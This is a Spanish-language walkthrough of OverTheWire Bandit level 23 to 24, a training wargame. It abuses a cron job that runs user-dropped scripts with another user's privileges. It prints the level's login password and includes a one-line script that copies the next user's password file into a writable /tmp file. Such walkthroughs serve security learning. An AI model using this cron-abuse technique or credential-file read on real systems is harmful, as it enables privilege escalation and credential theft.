# Bandit Level 23 → Level 24

## Objetivo
Un programa se ejecuta automáticamente a intervalos regulares desde **cron**, el programador de trabajos basado en el tiempo. Busque en /**etc/cron.d/** la configuración y ver qué comando se está ejecutando.

**NOTA:** Este nivel requiere que crees tu propio primero shell-script. Este es un paso muy grande del que deberías estar orgulloso. ¡Tú mismo cuando superas este nivel!

**NOTA 2:** Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee mantener una copia alrededor...

## Datos de acceso al nivel
* Servidor: ssh bandit23@bandit.labs.overthewire.org
* Usuario: bandit23
* Contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución
``` bash 
bandit23@bandit:/$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/$ cat /etc/cron.d/cronjob_bandit24.sh
cat: /etc/cron.d/cronjob_bandit24.sh: No such file or directory
bandit23@bandit:/$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/$ cd /tmp/nvga02
bandit23@bandit:/tmp/nvga02$ nano nvgascript.sh
bandit23@bandit:/tmp/nvga02$ cat nvgascript.sh
cat /etc/bandit_pass/bandit24 > /tmp/nvga02/password
bandit23@bandit:/tmp/nvga02$ chmod 777 nvgascript.sh
bandit23@bandit:/tmp/nvga02$ touch password
bandit23@bandit:/tmp/nvga02$ chmod 666 password
bandit23@bandit:/tmp/nvga02$ cp nvgascript.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/nvga02$ cat password
'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar'
```

## Notas Adicionales
|Comando | Descripcion |
|-----|-------|
| nano | Abre un editor de tecto para editar. |
| chmod | Modifica los permisos de un archivo. |

## Referencias
* [nano](https://josesalazarpantoja.gitbooks.io/comandos-basicos-linux/content/comando-nano.html)
* [chmod](https://www.howtogeek.com/437958/how-to-use-the-chmod-command-on-linux/)

Fecha: 28/02/2023.